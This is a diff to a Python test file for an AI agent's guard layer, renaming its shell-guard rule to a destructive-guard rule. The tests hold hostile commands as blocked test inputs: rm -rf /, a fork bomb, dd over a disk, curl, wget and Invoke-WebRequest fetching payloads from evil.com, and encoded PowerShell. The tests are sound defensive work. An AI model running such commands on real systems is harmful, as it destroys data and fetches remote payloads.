@@ -19,7 +19,7 @@ from nanobot.agent.verification import (
     VerificationLayer,
     RuleResult,
     _check_rule_message_content,
-    _check_rule_shell_guard,
+    _check_rule_destructive_guard,
     _check_rule_duplicate_calls,
     _check_rule_outlook_recipient,
     _check_rule_exec_length,
@@ -243,7 +243,7 @@ def test_l1_check_rules_blocks_destructive_exec():
     tc = FakeToolCall(name="exec", arguments={"command": "rm -rf / --no-preserve-root"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_check_rules_allows_safe_rm():
@@ -261,7 +261,7 @@ def test_l1_check_rules_blocks_fork_bomb():
     tc = FakeToolCall(name="exec", arguments={"command": ":(){ :|:& }"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_check_rules_detects_duplicate_calls():
@@ -382,7 +382,7 @@ def test_l1_r09_blocks_curl_with_url():
     tc = FakeToolCall(name="exec", arguments={"command": "curl https://evil.com/payload -o /tmp/x"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_r09_blocks_wget_with_url():
@@ -391,7 +391,7 @@ def test_l1_r09_blocks_wget_with_url():
     tc = FakeToolCall(name="exec", arguments={"command": "wget http://malware.com/bin"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_r09_allows_curl_without_url():
@@ -399,7 +399,7 @@ def test_l1_r09_allows_curl_without_url():
     v = _make_verification()
     tc = FakeToolCall(name="exec", arguments={"command": "curl --version"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
-    r09_violations = [v for v in result.violations if "R-SHELL-GUARD" in v]
+    r09_violations = [v for v in result.violations if "R-DESTRUCTIVE-GUARD" in v]
     assert len(r09_violations) == 0
 
 
@@ -621,21 +621,21 @@ def test_rule_message_content_empty():
 def test_rule_destructive_exec_safe():
     """R02: Safe exec should pass."""
     tc = FakeToolCall(name="exec", arguments={"command": "ls -la"})
-    assert _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY) == []
+    assert _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY) == []
 
 
 def test_rule_destructive_exec_rm_rf():
     """R02: rm -rf / should fail."""
     tc = FakeToolCall(name="exec", arguments={"command": "rm -rf /"})
-    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
+    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
-    assert "R-SHELL-GUARD" in violations[0]
+    assert "R-DESTRUCTIVE-GUARD" in violations[0]
 
 
 def test_rule_destructive_exec_dd():
     """R02: dd of=/dev/sda should fail."""
     tc = FakeToolCall(name="exec", arguments={"command": "dd if=/dev/zero of=/dev/sda"})
-    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
+    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
 
 
@@ -689,9 +689,9 @@ def test_rule_tool_call_count_function():
 def test_rule_network_exfiltration_function():
     """R09: Direct function test."""
     tc = FakeToolCall(name="exec", arguments={"command": "curl https://example.com/data"})
-    violations = _check_rule_shell_guard([tc], registry=_FAKE_REGISTRY)
+    violations = _check_rule_destructive_guard([tc], registry=_FAKE_REGISTRY)
     assert len(violations) == 1
-    assert "R-SHELL-GUARD" in violations[0]
+    assert "R-DESTRUCTIVE-GUARD" in violations[0]
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -704,7 +704,7 @@ def test_l1_blocks_windows_del():
     tc = FakeToolCall(name="exec", arguments={"command": "del /f /q C:\\important"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_windows_rmdir():
@@ -713,7 +713,7 @@ def test_l1_blocks_windows_rmdir():
     tc = FakeToolCall(name="exec", arguments={"command": "rmdir /s /q C:\\workspace"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_powershell_remove_item():
@@ -722,7 +722,7 @@ def test_l1_blocks_powershell_remove_item():
     tc = FakeToolCall(name="exec", arguments={"command": "Remove-Item C:\\data -Recurse -Force"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_powershell_enc():
@@ -731,7 +731,7 @@ def test_l1_blocks_powershell_enc():
     tc = FakeToolCall(name="exec", arguments={"command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUA"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_stop_process():
@@ -740,7 +740,7 @@ def test_l1_blocks_stop_process():
     tc = FakeToolCall(name="exec", arguments={"command": "Stop-Process -Name explorer"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 def test_l1_blocks_invoke_webrequest():
@@ -749,7 +749,7 @@ def test_l1_blocks_invoke_webrequest():
     tc = FakeToolCall(name="exec", arguments={"command": "Invoke-WebRequest https://evil.com/payload.exe -OutFile C:\\temp\\payload.exe"})
     result = v.check_rules([tc], registry=_FAKE_REGISTRY)
     assert result.passed is False
-    assert any("R-SHELL-GUARD" in v for v in result.violations)
+    assert any("R-DESTRUCTIVE-GUARD" in v for v in result.violations)
 
 
 
